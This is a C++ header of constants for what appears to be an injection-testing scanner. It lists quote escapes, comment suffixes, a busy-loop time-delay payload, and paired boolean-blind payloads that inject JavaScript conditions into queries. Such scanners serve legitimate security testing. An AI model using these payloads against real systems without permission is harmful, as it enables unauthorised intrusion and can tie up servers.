#pragma once

#include <string>
#include <vector>

namespace Constants {
const double AnomalySimilarityThreshold = 85.0;

const std::vector<std::string> Escapes = {"'", "\"", "`", ""};

const std::vector<std::string> Suffixes = {" //", " /*"};

// For Time Blind (Format string, {} will be replaced with delay in ms)
// Note: JS curly braces are escaped as {{ and }} for std::format
const std::vector<std::string> TimeDelays = {
    " || (function(){{ var d = new Date().getTime(); while(new "
    "Date().getTime() < d + {}){{}} return true; }})()"};

// For Boolean Blind (True vs False statements)
const std::vector<std::pair<std::string, std::string>> BooleanBlinds = {
    // Converted from previous tautologies
    {" || false", " || true"},
    {" || 1==2", " || 1==1"},
    {" || 'a'=='b'", " || 'a'=='a'"},
    {" || 1==='1'", " || 1=='1'"},
    {" || typeof 1 === 'string'", " || typeof 1 === 'number'"}};

} // namespace Constants
